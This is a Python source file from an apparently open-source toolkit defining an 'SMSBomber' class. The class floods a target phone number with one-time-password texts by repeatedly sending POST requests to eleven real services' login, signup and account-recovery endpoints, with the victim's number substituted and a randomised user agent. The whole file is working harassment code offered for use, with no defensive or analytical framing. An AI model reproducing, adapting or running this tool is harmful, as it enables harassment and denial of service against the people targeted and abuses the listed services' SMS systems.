"""
 Copyright (c) 2023-2025. Vili and contributors.

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import requests, random, time
from helper import printer, timer
from helper import randomuser
from colorama import Style


class SMSBomber:
    """
    Spams SMS to the target phone number.

    :param number: target phone number
    :param count: number of SMS to send
    :param throttle: throttle time between each SMS
    """
    def __init__(self, number, count, throttle) -> None:
        self.number = number
        self.count = int(count)
        self.throttle = int(throttle)
        self.urls = [
            f"https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{self.number}",
            f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={self.number}",
            f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={self.number}",
            f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={self.number}",
            f"https://www.flipkart.com/api/6/user/signup/status?phone={self.number}",
            f"https://www.hike.in/v1/account/auth/2.0/otp/send?msisdn={self.number}",
            f"https://www.instagram.com/accounts/account_recovery_send_ajax/?email_or_username={self.number}&recaptcha_challenge_field=",
            f"https://www.zomato.com/php/o2_send.php?phone={self.number}",
            f"https://api.dunzo.in/api/v1/users/send_login_otp?phone={self.number}",
            f"https://auth.gojekapi.com/v2/customer/otp?phone_number=%2B{self.number}",
            f"https://www.olx.com.lb/api/auth/authenticate/byPhone?phone={self.number}"
        ]
        self.session = requests.session()
        self.session.headers = f"{randomuser.GetUser()}"

        try:
            printer.info(f"Trying to send {Style.BRIGHT}{self.count}{Style.RESET_ALL} SMS to {Style.BRIGHT}{self.number}{Style.RESET_ALL}...")
            self.start()
        except KeyboardInterrupt:
            printer.error("Cancelled..!")
        except Exception as e:
            printer.error(f"Error : {e}")

    @timer.timer
    def start(self) -> None:
        successes = 0
        fails = 0
        try:
            for i in range(self.count):
                url = random.choice(self.urls)
                response = self.session.post(url)
                time.sleep(self.throttle)

                if response.status_code == 200:
                    successes += 1
                    printer.success(f"{successes} Sent successfully.")
                else:
                    fails += 1
                    printer.warning(f"{fails} Failed to send... [{response.status_code}]")
        except Exception as e:
            printer.error(f"Error : {e}")

        printer.success(f"Finished sending {successes} SMS to {Style.BRIGHT}{self.number}{Style.RESET_ALL}..!")
